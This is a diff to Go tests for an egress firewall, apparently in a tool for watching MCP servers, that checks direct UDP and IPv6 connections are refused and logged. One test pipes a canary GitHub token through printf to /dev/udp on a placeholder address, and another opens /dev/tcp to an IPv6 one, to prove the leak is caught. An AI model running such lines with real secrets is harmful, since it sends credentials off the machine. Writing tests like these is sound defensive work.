@@ -10,6 +10,9 @@ import (
 	"strings"
 	"syscall"
 	"testing"
+
+	"github.com/JairJosafath/mcp-customs/src/internal/canary"
+	"github.com/JairJosafath/mcp-customs/src/internal/findings"
 )
 
 // nobody is the unprivileged account the root-only tests run clients as.
@@ -41,17 +44,30 @@ func asNobody(t *testing.T, script string) (string, error) {
 	return string(out), err
 }
 
-// upFirewall serves e and holds nobody's traffic to it, until the test ends.
+// upFirewall serves e and holds nobody's traffic to it, refused packets
+// logged to e, until the test ends.
 func upFirewall(t *testing.T, e *Egress) {
 	t.Helper()
 	l, err := Listen(t.Context())
 	if err != nil {
 		t.Fatal(err)
 	}
-	stop := e.Serve(l, RedirectedFrom)
-	t.Cleanup(stop)
+	t.Cleanup(e.Serve(l, RedirectedFrom))
+	group := uint16(2000 + os.Getpid()%1000)
+	nflog, err := OpenNFLog(group)
+	if err != nil {
+		t.Fatal(err)
+	}
+	logged := make(chan error, 1)
+	go func() { logged <- e.ServeNFLog(nflog) }()
+	t.Cleanup(func() {
+		_ = nflog.Close()
+		if err := <-logged; err != nil {
+			t.Error(err)
+		}
+	})
 	proxy, dns, catch := l.Ports()
-	fw := Firewall{Chain: fmt.Sprintf("MCPC_TEST_%d", os.Getpid()), UID: nobody, ProxyPort: proxy, DNSPort: dns, CatchPort: catch}
+	fw := Firewall{Chain: fmt.Sprintf("MCPC_TEST_%d", os.Getpid()), UID: nobody, ProxyPort: proxy, DNSPort: dns, CatchPort: catch, NFLogGroup: group}
 	if err := fw.Up(t.Context(), Exec); err != nil {
 		t.Fatal(err)
 	}
@@ -75,14 +91,57 @@ cat <&3`)
 	}
 	// The catcher records a connection before it resets it, so it is
 	// recorded by the time the client has seen the reset.
-	want := ConnectDetail{Address: "203.0.113.7", Port: 443, Via: "direct", Refused: true}
-	if got := rec.of(KindConnect); len(got) != 1 || got[0] != want {
+	want := ConnectDetail{Address: "203.0.113.7", Port: 443, Proto: "tcp", Via: "direct", Refused: true}
+	if got := rec.of(KindConnect); len(got) != 1 || !jsonEqual(t, got[0], want) {
 		t.Errorf("connect = %+v, want %+v", got, want)
 	}
+}
 
-	// UDP anywhere but DNS, and IPv6, are rejected outright.
-	if out, err := asNobody(t, `echo x > /dev/udp/203.0.113.7/123`); err == nil {
-		t.Errorf("direct UDP = %q, want it rejected", out)
+func TestDirectUDPIsRefusedAndRecordedWithTheCanariesInIt(t *testing.T) {
+	requireFirewall(t)
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	upFirewall(t, e)
+
+	out, err := asNobody(t, "printf 'k=%s' '"+testCanaries.Get(canary.GitHubToken)+"' > /dev/udp/203.0.113.9/9999")
+	if err == nil {
+		t.Errorf("direct UDP = %q, want it refused", out)
+	}
+	// NFLOG delivers the packet to the harness after the sender is refused.
+	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) > 0 })
+	want := ConnectDetail{
+		Address: "203.0.113.9", Port: 9999, Proto: "udp", Via: "direct", Refused: true,
+		Canaries: []findings.Match{{Canary: canary.GitHubToken, Encoding: findings.Plain}},
+	}
+	if got := rec.of(KindConnect); !jsonEqual(t, got[0], want) {
+		t.Errorf("connect = %+v, want %+v", got, want)
+	}
+}
+
+func TestDirectIPv6IsRefusedAndRecorded(t *testing.T) {
+	requireFirewall(t)
+	if fd, err := syscall.Socket(syscall.AF_INET6, syscall.SOCK_DGRAM, 0); err != nil {
+		t.Skipf("this kernel has no IPv6 (%v), so there is no IPv6 egress to refuse; the ip6tables chain still rejects and logs it all", err)
+	} else {
+		_ = syscall.Close(fd)
+	}
+	if err := Exec(t.Context(), Command{"ip6tables", "-w", "-t", "filter", "-L", "OUTPUT", "-n"}); err != nil {
+		t.Skipf("needs ip6tables: %v", err)
+	}
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	upFirewall(t, e)
+
+	if out, err := asNobody(t, `exec 3<>/dev/tcp/2001:db8::7/443`); err == nil {
+		t.Errorf("direct IPv6 TCP = %q, want it refused", out)
+	}
+	rec.waitFor(t, func() bool { return len(rec.of(KindConnect)) > 0 })
+	want := ConnectDetail{Address: "2001:db8::7", Port: 443, Proto: "tcp", Via: "direct", Refused: true}
+	if got := rec.of(KindConnect); !jsonEqual(t, got[0], want) {
+		t.Errorf("connect = %+v, want %+v", got, want)
 	}
 }
 
